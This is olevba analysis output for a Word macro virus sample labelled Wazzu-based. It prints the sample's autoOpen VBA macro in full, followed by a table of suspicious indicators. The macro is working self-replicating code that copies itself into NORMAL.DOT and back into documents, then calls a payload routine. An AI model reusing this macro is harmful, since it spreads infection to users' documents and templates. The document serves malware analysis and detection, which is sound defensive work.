olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-978f8ebc8260e490b4cccdb3ce116002b55a4aca
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-978f8ebc8260e490b4cccdb3ce116002b55a4aca - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-978f8ebc8260e490b4cccdb3ce116002b55a4aca - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
    On Error GoTo -1: On Error GoTo errCaught
        
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg

    fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
    globMacro$ = "Global:autoOpen"
    MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFile$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globMacro$, fileMacro$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fileMacro$, globMacro$
    End If

    WordBasic.Call "Payload"

GoTo bye
errCaught:

bye:
    On Error GoTo -1: On Error GoTo 0

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

